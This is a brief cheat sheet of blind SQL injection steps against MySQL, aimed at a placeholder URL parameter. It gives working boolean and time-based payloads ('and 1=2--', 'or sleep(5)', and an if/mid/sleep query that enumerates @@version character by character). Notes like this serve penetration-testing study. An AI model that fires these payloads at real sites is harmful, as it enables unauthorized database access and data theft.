Blind SQL Injection attack steps, tested on mysql(start from -> http://vulnsite.com/clients.php?id=150):

	# Important note! For Sql injection comments (--) to work, you need to include a space at the end (-- ) or (-- -)	

	Step 1: id=150'	-> error is not visible, so try blind injection
	Step 2: id=150 and 1=1-- -> same output? Try (id=150 and 1=2--) -> if this gives no output anymore, you have a sql injection
	Step 3: id=150 or sleep(5) -> page takes longer than 5 seconds to load, then you have a sql injection
	
	Step 4: enumeration phase -> We use 'if' statements with 'sleep' to see what data exists and what doesn't (there are scripts for this)
	# Say that we know '@@version' returns 'mysql 3.5.0', then we can do a test to see if our enumeration query works
	# So we can do 'select if(mid(@@version,1,1) = 'm', sleep(5), 0)', this sleeps for 5 seconds if the first character returned is 'm'
	# If this query takes 5+ seconds to run, it means it's true
